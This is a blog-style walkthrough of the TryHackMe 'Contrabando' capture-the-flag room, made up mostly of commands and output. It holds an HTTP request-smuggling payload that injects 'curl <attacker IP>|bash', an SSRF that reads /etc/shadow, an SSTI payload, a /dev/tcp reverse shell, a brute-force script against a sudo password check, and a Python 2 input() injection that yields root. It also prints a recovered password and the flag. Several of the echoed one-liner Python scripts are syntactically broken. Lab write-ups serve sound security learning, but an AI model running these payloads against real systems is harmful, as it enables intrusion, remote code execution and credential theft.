---
title: "Tryhackme: Contrabando"
author: NeoVirex
categories: [thm]
tags: [CTF, thm, web, FFUF, ssh, php, python]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_contrabando
image:
  path: room-img.png
description: Never tell me the odds.
---

# Contrabando

## Reconnaissance && Service Enumeration

```jsx
└─$ nmap -T4 -n -sC -sV -Pn -p 22,80 ctf.thm     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 09:14 EDT
Nmap scan report for ctf.thm (10.10.87.205)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 41:ed:cf:46:58:c8:5d:41:04:0a:32:a0:10:4a:83:3b (RSA)
|   256 e8:f9:24:5b:e4:b0:37:4f:00:9d:5c:d3:fb:54:65:0a (ECDSA)
|_  256 57:fd:4a:1b:12:ac:7c:90:80:88:b8:5a:5b:78:30:79 (ED25519)
80/tcp open  http    Apache httpd 2.4.55 ((Unix))
|_http-server-header: Apache/2.4.55 (Unix)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds
                  
```

### Ports

22 ssh 

80 Apache 

### Webs

http:// 10.10.87.205[/](http://10.10.87.205/)

![img2.png](img2.png)

http://10.10.87.205/page/home.html

![img3.png](img3.png)

## Web Application Analysis

### hidden directory using FFUF

```jsx
─$ ffuf -u http://ctf.thm/page/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc all -fs 94

 :: Method           : GET
 :: URL              : http://ctf.thm/page/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 94
________________________________________________

.profile                [Status: 200, Size: 150, Words: 19, Lines: 3, Duration: 163ms]
.rhosts                 [Status: 200, Size: 149, Words: 19, Lines: 3, Duration: 155ms]
.bash_history           [Status: 200, Size: 155, Words: 19, Lines: 3, Duration: 159ms]
.perf                   [Status: 200, Size: 147, Words: 19, Lines: 3, Duration: 159ms]
                        [Status: 200, Size: 118, Words: 14, Lines: 3, Duration: 161ms]
_adm                    [Status: 200, Size: 146, Words: 19, Lines: 3, Duration: 161ms]
.history                [Status: 200, Size: 150, Words: 19, Lines: 3, Duration: 161ms]
.bashrc                 [Status: 200, Size: 149, Words: 19, Lines: 3, Duration: 161ms]
.cvsignore              [Status: 200, Size: 152, Words: 19, Lines: 3, Duration: 162ms]
.hta                    [Status: 200, Size: 146, Words: 19, Lines: 3, Duration: 163ms]
.cache                  [Status: 200, Size: 148, Words: 19, Lines: 3, Duration: 173ms]
_code                   [Status: 200, Size: 147, Words: 19, Lines: 3, Duration: 175ms]
.htaccess               [Status: 200, Size: 151, Words: 19, Lines: 3, Duration: 180ms]
_ajax                   [Status: 200, Size: 147, Words: 19, Lines: 3, Duration: 183ms]
.sh_history             [Status: 200, Size: 153, Words: 19, Lines: 3, Duration: 183ms]
.svn/entries            [Status: 200, Size: 154, Words: 19, Lines: 3, Duration: 185ms]
...
```

### specify the flags in the command i run

gen.php

![img1.png](img1.png)

```jsx
<?php
function generateRandomPassword($length) {
    $password = exec("tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c " . $length);
    return $password;
}

if(isset($_POST['length'])){
        $length = $_POST['length'];
        $randomPassword = generateRandomPassword($length);
        echo $randomPassword;
}else{
    echo "Please insert the length parameter in the URL";
}
?>
```

## Vulnerability Scanning

## Exploit & Initial Access

```jsx
test%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0APOST%20/gen.php%20HTTP/1.1%0D%0AHost:%20localhost%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2031%0D%0A%0D%0Alength=;curl%2010.23.118.121%7Cbash;%0D%0A%0D%0AGET%20/test
```

```jsx
(echo -e "GET /page/test HTTP/1.1\r\nHost: localhost\r\n\r\nPOST /gen.php HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nlength=;curl 10.23.118.121|bash;\r\n\r\nGET /te HTTP/1.1\r\nHost: localhost\r\n\r\n") | nc 10.10.87.205 80
```

```jsx

import socket

payload = (
    "GET /page/test HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
    "POST /gen.php HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 31\r\n"
    "\r\n"
    "length=;curl 10.23.118.121|bash;\r\n"
    "\r\n"
    "GET /te HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)

s = socket.socket()
s.connect(("10.10.87.205", 80))
s.send(payload.encode())
print(s.recv(4096).decode())
s.close()

```

## Privilege Escalation

### file:///home/hansolo/app/app.py

```jsx
from flask import Flask, render_template, render_template_string, request
import pycurl
from io import BytesIO

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def display_website():
    if request.method == 'POST':
        website_url = request.form['website_url']

        # Use pycurl to fetch the content of the website
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, website_url)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()

        # Extract the content and convert it to a string
        content = buffer.getvalue().decode('utf-8')
        buffer.close()
        website_content = '''
        <!DOCTYPE html>
<html>
<head>
    <title>Website Display</title>
</head>
<body>
    <h1>Fetch Website Content</h1>
    <h2>Currently in Development</h2>
    <form method="POST">
        <label for="website_url">Enter Website URL:</label>
        <input type="text" name="website_url" id="website_url" required>
        <button type="submit">Fetch Website</button>
    </form>
    <div>
        %s
    </div>
</body>
</html>'''%content

        return render_template_string(website_content)

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0",debug=False)
```

## Lateral Movement

curl -s -d 'website_url=http://10.23.118.121/'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)

curl -s -d 'website_url=http://10.23.118.121/test.txt'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)

curl -s -d 'website_url=file:///proc/self/status'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)

curl -s -d 'website_url=file:///etc/shadow'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)

curl -s -d 'website_url=file:///etc/shadow'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)

curl -s -d 'website_url=file:////home/hansolo/Desktop/' [http://172.18.0.1:5000/](http://172.18.0.1:5000/) -o-

### a shell for the local web inside the shell shell

```jsx
$ cat template
{{ self.**init**.**globals**.**builtins**.**import**('os').popen('curl "http://10.23.118.121|bash').read() }}

$ python3 -m http.server 80
```

```jsx

```

```jsx
┌──(neo㉿neo)-[~/pro/thm/cont]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.23.118.121] from (UNKNOWN) [10.10.87.205] 34742
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@124a042cc76c:/var/www/html$ curl -s -d 'website_url=http://10.23.118.121/template'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)
<://10.23.118.121/template'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)
```

```jsx
curl -s -d 'website_url=http://10.23.118.121/template'  [http://172.18.0.1:5000/](http://172.18.0.1:5000/)
```

```jsx
bash -i >& /dev/tcp/10.23.118.121/4444 0>&1 &
```

### fall scripts

```jsx
echo -e 'import subprocess\nimport string\n\ncharset = string.ascii_letters + string.digits\npassword = ""\n\nwhile True:\n    found = False\n    for char in charset:\n        attempt = password + char\n        print(f"\r[+] Trying: {attempt}", end="")\n        proc = subprocess.Popen(\n            ["sudo", "-S", "/usr/bin/bash", "/usr/bin/vault"],\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True\n        )\n        stdout, stderr = proc.communicate(input=attempt + "\n")\n        if "Password matched!" in stdout:\n            password += char\n            found = True\n            break\n    if not found:\n        break\n\nprint(f"\r[+] Final Password: {password}")' > [script3.py](http://script3.py/)
```

```jsx
echo -e 'import subprocess, string; charset = string.ascii_letters + string.digits; password = ""; while True: found = False; [stdout, stderr := subprocess.Popen(["sudo", "-S", "/usr/bin/bash", "/usr/bin/vault"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).communicate(input=(password + char + "\n")) if "Password matched!" in stdout and (password := password + char) or False for char in charset] or break; print(f"\r[+] Final Password: {password}")' > [script4.py](http://script4.py/)
```

```jsx
echo -e 'import subprocess, string; charset = string.ascii_letters + string.digits; password = ""; while True: found = False; [stdout, stderr := subprocess.Popen(["sudo", "-S", "/usr/bin/bash", "/usr/bin/vault"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).communicate(input=(password + char + "\n")) if "Password matched!" in stdout and (password := password + char) or False for char in charset] or break; print(f"\r[+] Final Password: {password}")' > [script5.py](http://script5.py/)
```

```jsx
echo -e 'import subprocess, string; charset = string.ascii_letters + string.digits; password = ""; while True: found = False; for char in charset: attempt = password + char; print(f"\r[+] Trying: {attempt}", end=""); proc = subprocess.Popen(["sudo", "-S", "/usr/bin/bash", "/usr/bin/vault"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True); stdout, stderr = proc.communicate(input=(attempt + "\n")); if "Password matched!" in stdout: password += char; found = True; break; if not found: break; print(f"\r[+] Final Password: {password}")' > [script6.py](http://script6.py/)
```

```jsx
echo -e 'import subprocess, string; charset = string.ascii_letters + string.digits; password = ""; while True: found = False; for char in charset: attempt = password + char; print("[+] Trying: " + attempt, end=""); proc = subprocess.Popen(["sudo", "-S", "/usr/bin/bash", "/usr/bin/vault"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True); stdout, stderr = proc.communicate(input=(attempt + "\n")); if "Password matched!" in stdout: password += char; found = True; break; if not found: break; print("[+] Final Password: " + password)' > [script7.py](http://script7.py/)
```

```jsx
echo -e 'import subprocess; import string; charset = string.ascii_letters + string.digits; password = ""; while True: found = False; for char in charset: attempt = password + char + "*"; print(f"\r[+] Password: {password+char}", end=""); proc = subprocess.Popen(["sudo", "/usr/bin/bash", "/usr/bin/vault"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True); stdout, stderr = proc.communicate(input=attempt + "\n"); if "Password matched!" in stdout: password += char; found = True; break; if not found: break; print(f"\r[+] Final Password: {password}")' > [script8.py](http://script8.py/)
```

```jsx
echo -e '#!/bin/bash

check () {
        if [ ! -e "$file_to_check" ]; then
            /usr/bin/echo "File does not exist."
            exit 1
        fi
        compare
}

compare () {
        content=$(/usr/bin/cat "$file_to_check")

        read -s -p "Enter the required input: " user_input

        if [[ $content == $user_input ]]; then
            /usr/bin/echo ""
            /usr/bin/echo "Password matched!"
            /usr/bin/cat "$file_to_print"
        else
            /usr/bin/echo "Password does not match!"
        fi
}

file_to_check="/root/password"
file_to_print="/root/secrets"

check' > [script9.py](http://script9.py/)
```

### script

```jsx
#!/bin/bash

file_to_check="/root/password"
file_to_print="/root/secrets"

check () {
    if [ ! -e "$file_to_check" ]; then
        echo "File does not exist."
        exit 1
    fi
    compare
}

compare () {
    content=$(cat "$file_to_check")

    read -s -p "Enter the required input: " user_input
    echo ""

    if [[ "$content" == "$user_input" ]]; then
        echo "Password matched!"
        cat "$file_to_print"
    else
        echo "Password does not match!"
    fi
}

check

```

```jsx
                                                                                                                                               
┌──(neo㉿neo)-[~/Downloads/rustscan.deb]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.23.118.121] from (UNKNOWN) [10.10.87.205] 57070
bash: cannot set terminal process group (718): Inappropriate ioctl for device
bash: no job control in this shell
hansolo@contrabando:~$ clear
clear
TERM environment variable not set.
hansolo@contrabando:~$ sudo -l
sudo -l
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
hansolo@contrabando:~$ ls
ls
app
hansolo_userflag.txt
nana
nano
script12.sh
script1.py
script3.py
script4.py
script5.py
script6.py
script7.py
script8.py
script9.py
script.py
hansolo@contrabando:~$ ./script12.sh
./script12.sh
File does not exist.
hansolo@contrabando:~$ echo "#!/bin/bash
# Full charset: letters, digits, and common specials
charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/'

password=""

while true; do
    found_char=""
    for ((i=0; i<${#charset}; i++)); do
        c="${charset:$i:1}"
        guess="${password}${c}*"

        # run vault and feed it the guess
        output=$(echo "$guess" | sudo /usr/bin/bash /usr/bin/vault 2>/dev/null)

        if echo "$output" | grep -q "Password matched!"; then
            password+=$c
            echo "[+] Current password: $password"
            found_char=1
            break
        fi
    done

    # stop when no char matched → full password recovered
    if [ -z "$found_char" ]; then
        echo "[*] Finished! Full password: $password"
        break
    fi
done
" > brut.sh
echo "#!/bin/bash
bash: !/bin/bash: event not found
hansolo@contrabando:~$ # Full charset: letters, digits, and common specials
<NOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/'
hansolo@contrabando:~$ 
hansolo@contrabando:~$ password=""
hansolo@contrabando:~$ 
hansolo@contrabando:~$ while true; do
>     found_char=""
>     for ((i=0; i<${#charset}; i++)); do
>         c="${charset:$i:1}"
>         guess="${password}${c}*"
> 
>         # run vault and feed it the guess
<s" | sudo /usr/bin/bash /usr/bin/vault 2>/dev/null)
> 
>         if echo "$output" | grep -q "Password matched!"; then
>             password+=$c
>             echo "[+] Current password: $password"
>             found_char=1
>             break
>         fi
>     done
> 
>     # stop when no char matched → full password recovered
>     if [ -z "$found_char" ]; then
>         echo "[*] Finished! Full password: $password"
>         break
>     fi
> done
[+] Current password: E
[+] Current password: EQ
[+] Current password: EQu
[+] Current password: EQu5
[+] Current password: EQu5e
[+] Current password: EQu5eh
[+] Current password: EQu5ehw
[+] Current password: EQu5ehwH
[+] Current password: EQu5ehwHc
[+] Current password: EQu5ehwHcR
[+] Current password: EQu5ehwHcRf
[+] Current password: EQu5ehwHcRfZ
[+] Current password: EQu5ehwHcRfZ*
[+] Current password: EQu5ehwHcRfZ**
[+] Current password: EQu5ehwHcRfZ***

```

### ssh using the password

```jsx
└─$ ssh hansolo@ctf.thm                                    
The authenticity of host 'ctf.thm (10.10.87.205)' can't be established.
ED25519 key fingerprint is SHA256:f4Mp+IGs5xCf/+gi0Dp45cPvpLtuaHcYdRVfltluFvE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'ctf.thm' (ED25519) to the list of known hosts.
hansolo@ctf.thm's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun 24 Aug 2025 06:01:08 PM UTC

  System load:  1.2                Processes:             153
  Usage of /:   71.4% of 11.21GB   Users logged in:       0
  Memory usage: 10%                IPv4 address for ens5: 10.10.87.205
  Swap usage:   0%

  => There are 2 zombie processes.

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

6 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Nov 14 06:41:33 2023 from 10.13.4.71
hansolo@contrabando:~$ whoami
hansolo
hansolo@contrabando:~$ sudo -l
Matching Defaults entries for hansolo on contrabando:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hansolo may run the following commands on contrabando:
    (root) NOPASSWD: /usr/bin/bash /usr/bin/vault
    (root) /usr/bin/python* /opt/generator/app.py
hansolo@contrabando:~$ sudo su
[sudo] password for hansolo: 
Sorry, user hansolo is not allowed to execute '/usr/bin/su' as root on contrabando.
hansolo@contrabando:~$ sudo /usr/bin/py
py3clean          pydoc2.7          pygettext3.8      python3.8
py3compile        pydoc3            pyhtmlizer3       python3.8-config
py3versions       pydoc3.8          pyjwt3            python3-config
pyclean           pygettext2        python2           pyversions
pycompile         pygettext2.7      python2.7         
pydoc2            pygettext3        python3           
hansolo@contrabando:~$ sudo /usr/bin/python2 /opt/generator/app.py 
[sudo] password for hansolo: 

Sorry, try again.
[sudo] password for hansolo: 
Sorry, try again.
[sudo] password for hansolo: 
Enter the desired length of the password: 
Invalid input. Using default length of 12.
Any words you want to add to the password? __import__('os').system('/bin/bash')
root@contrabando:/home/hansolo# whoami
root
root@contrabando:/home/hansolo# cd root
bash: cd: root: No such file or directory
root@contrabando:/home/hansolo# cd /root
root@contrabando:~# ls
password  root.txt  secrets  smug  snap
root@contrabando:~# cat root.txt
THM{All_AbouT_PassW0rds}
root@contrabando:~# 

```

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>